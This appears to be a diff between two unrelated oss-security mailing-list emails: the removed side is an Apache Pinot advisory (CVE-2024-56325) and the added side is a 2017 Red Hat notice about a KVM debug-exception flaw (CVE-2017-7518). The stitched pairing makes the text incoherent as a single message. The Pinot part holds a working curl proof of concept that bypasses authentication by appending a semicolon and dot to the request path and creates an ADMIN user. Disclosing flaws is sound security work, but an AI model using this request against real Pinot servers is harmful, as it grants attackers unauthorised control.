@@ -1,4 +1,9 @@
-Received: (qmail 5885 invoked by uid 550); 27 Mar 2025 17:57:21 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["800" "Friday" "23" "June" "2017" "19:48:13" "+0530" "P J P" "ppandit@redhat.com" "<alpine.LFD.2.20.1706231946010.19155@wniryva>" "27" "[oss-security] CVE-2017-7518 Kernel: KVM: debug exception via syscall emulation" nil nil nil "6" "2017062314:18:13" "[oss-security] CVE-2017-7518 Kernel: KVM: debug exception via syscall emulation" (number mark "U       ppandit@redh Jun 23   27/800   " thread-indent "\"[oss-security] CVE-2017-7518 Kernel: KVM: debug exception via syscall emulation\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 23662 invoked by uid 550); 23 Jun 2017 14:18:30 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,86 +12,46 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 19526 invoked from network); 27 Mar 2025 11:34:51 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20230601; t=1743075281; x=1743680081; darn=lists.openwall.com;
-        h=cc:to:subject:message-id:date:from:mime-version:from:to:cc:subject
-         :date:message-id:reply-to;
-        bh=fhz1/eWqDMChIhiB+Rk6/RHlDU2QbVkpQd4LxDTQoTs=;
-        b=X6JVhNOiteIsREh9Jv6lgGRvcrY0g9Ti5btl+2dKXLN8CUtH9cpW0WpYZz5DPszYTm
-         G9ArCtwBXShD2vKGu0vIuyjFqLOUcjRr/rcC7yMlwEgPbPiJ96XOzvrzt8cm3b7DgN7g
-         jrMAzLg96nOKNfxr10ug747hE66/V34t9ChstamdgIE6PJ8bnEa0zAQZCyS01VRib1NY
-         NOPz212NgUmrn0CRB0TXXrKbdCRoTFohmzjfhuLu7Z0qOYofXx2HA+20IohJWwCc6a9h
-         3LoT1cc4oPcc27Cn1jSqI8CIGfyGiBDrUrmOSov3paJRrsnVhBTqCxDYf7Hbbh7GzWzF
-         M42A==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20230601; t=1743075281; x=1743680081;
-        h=cc:to:subject:message-id:date:from:mime-version:x-gm-message-state
-         :from:to:cc:subject:date:message-id:reply-to;
-        bh=fhz1/eWqDMChIhiB+Rk6/RHlDU2QbVkpQd4LxDTQoTs=;
-        b=sxcNXQUG7mTViWQSpWtpESA1bDGROk9qcU0OD8apvyPXDYrz1NFBy749sA06YbDRX3
-         hIFTMuoJus+5/KXUe87jiogwX1460QlfNZY1Ju0XzOdRbwE1PmfuyVNJxJA7LGGgRsox
-         dZwGkIVRE2SeEqEi/yrTjHjUkKf+NsySDETEQXx7C9IwE+1CaMz/mRqgrLSHD4mrRxJ2
-         Ol7TLpJt07eLJm3IzrOGZcHFBb0dKvC9pn3DdFDW6iYAZKffl4tlq1ZwMt6pKQM7gksB
-         97SdPKewcrAKE8ufuWdSuAeWy7dpXCzejmirTzeMiQISJA4Mp2ueEts26zjVJEXcQ+h/
-         kjXA==
-X-Gm-Message-State: AOJu0YwHNJhP1hQhh7loej1svsvYNwJRf+c/Ra6ZsT5i7kwZx/2JJfI6
-	8JCA8Kqt4If1lfKJa0fyjjzUUhm5oYg8UR+Ww+kdgAGSHo6ZiD3TqDpKPwcWUaC/b4ZYukJLsTe
-	yBp0U1uXMJrfMcf7EwZs5RgnzAaQw/pPJ
-X-Gm-Gg: ASbGncvSroa1nGbp0X43SOlDgGLDWOMpTfQpYvWJ553+K4Icu10+yVwvxHLiFoPxnYn
-	DQLNifmPwU5yJGWoP2jz48B8FNzO5cf6GFE+bheB/NlDOgXeJ60w7wOSR/+L53g1HnjwjduGqT0
-	IAtbfRTcMEL1Wagt43X0MJcEK3WbVB4F/16syXIPqc3V7mxe13JZ0AhvvAhg==
-X-Google-Smtp-Source: AGHT+IH2fJYEnwaJOJAFfHRwiDWP66VScxYu3lBT2iFaQvtlJ2AJGx13ddhybdmV3HkkkF6vJNiTq2EtGdoo78DoSMI=
-X-Received: by 2002:a05:690c:10c:b0:6ee:b726:62cd with SMTP id
- 00721157ae682-70225166a6amr21334607b3.9.1743075280671; Thu, 27 Mar 2025
- 04:34:40 -0700 (PDT)
+Received: (qmail 23638 invoked from network); 23 Jun 2017 14:18:29 -0000
+DMARC-Filter: OpenDMARC Filter v1.3.2 mx1.redhat.com D0E1E40F14
+Authentication-Results: ext-mx06.extmail.prod.ext.phx2.redhat.com; dmarc=none (p=none dis=none) header.from=redhat.com
+Authentication-Results: ext-mx06.extmail.prod.ext.phx2.redhat.com; spf=pass smtp.mailfrom=ppandit@redhat.com
+DKIM-Filter: OpenDKIM Filter v2.11.0 mx1.redhat.com D0E1E40F14
+Date: Fri, 23 Jun 2017 19:48:13 +0530 (IST)
+From: P J P <ppandit@redhat.com>
+X-X-Sender: pjp@javelin
+To: oss security list <oss-security@lists.openwall.com>
+Message-ID: <alpine.LFD.2.20.1706231946010.19155@wniryva>
 MIME-Version: 1.0
-From: siddharth teotia <siddharthteotia@gmail.com>
-Date: Thu, 27 Mar 2025 04:34:29 -0700
-X-Gm-Features: AQ5f1JrsS-UQp9jEkqNioXgtyA2LqsPf0vLHQfTUU6-kJpZj9rrZ_L5-dvPYxBw
-Message-ID: <CAJw6sH1FZTzhoYL3NJDmE6K2zvi-QXYsnakZYcELZHmMZe-m0w@mail.gmail.com>
-To: oss-security@lists.openwall.com
-Cc: dev@pinot.apache.org, Apache Security Team <security@apache.org>, 
-	zdi-disclosures@trendmicro.com
-Content-Type: multipart/alternative; boundary="000000000000ebdb8206315156aa"
-Subject: [oss-security] CVE-2024-56325: Apache Pinot: Authentication bypass issue. If the
- path does not contain / and contain . authentication is not required
+Content-Type: text/plain; format=flowed; charset=US-ASCII
+X-Scanned-By: MIMEDefang 2.79 on 10.5.11.13
+X-Greylist: Sender IP whitelisted, not delayed by milter-greylist-4.5.16 (mx1.redhat.com [10.5.110.30]); Fri, 23 Jun 2017 14:18:18 +0000 (UTC)
+Subject: [oss-security] CVE-2017-7518 Kernel: KVM: debug exception via syscall emulation
 
---000000000000ebdb8206315156aa
-Content-Type: text/plain; charset="UTF-8"
+    Hello,
 
-*Severity:* critical
-*Affected versions:*
+Linux kernel built with the Kernel-based Virtual Machine(CONFIG_KVM) support 
+is vulnerable to an incorrect debug exception(#DB) error. It could occur while 
+emulating a syscall instruction.
 
-- Apache Pinot before 1.3
-*Description:*
+A user/process inside guest could use this flaw to potentially escalate their 
+privileges inside guest.
 
-Authentication Bypass Issue
+Note: Linux guests are not affected.
 
-If the path does not contain / and contain., authentication is not required.
-*Expected Normal Request and Response Example*
+Upstream patch:
+---------------
+   -> https://www.spinics.net/lists/kvm/msg151817.html
 
-curl -X POST -H "Content-Type: application/json" -d
-{\"username\":\"hack2\",\"password\":\"hack\",\"component\":\"CONTROLLER\",\"role\":\"ADMIN\",\"tables\":[],\"permissions\":[],\"usernameWithComponent\":\"hack_CONTROLLER\"}
- http://{server_ip}:9000/users
+Reference:
+----------
+   -> https://bugzilla.redhat.com/show_bug.cgi?id=1464473
+   -> https://www.spinics.net/lists/kvm/msg151819.html
+   -> https://xenbits.xen.org/xsa/advisory-204.html
 
-Return: {"code":401,"error":"HTTP 401 Unauthorized"}
-*Malicious Request and Response Example*
+'CVE-2017-7518' has been assigned to this issue by Red Hat Inc.
 
-curl -X POST -H "Content-Type: application/json" -d
-'{\"username\":\"hack\",\"password\":\"hack\",\"component\":\"CONTROLLER\",\"role\":\"ADMIN\",\"tables\":[],\"permissions\":[],\"usernameWithComponent\":\"hack_CONTROLLER\"}'
- http://{serverip}:9000/users; http://{serverip}:9000/users; .
-
-Return: {"users":{}}
-
-A new user gets added bypassing authentication, enabling the user to
-control Pinot.
-
-References:https://www.cve.org/CVERecord?id=CVE-2024-56325
-
-Thanks
-
-Siddharth (Apache Pinot PMC)
-
---000000000000ebdb8206315156aa--
+Thank you.
+--
+Prasad J Pandit / Red Hat Product Security Team
+47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F
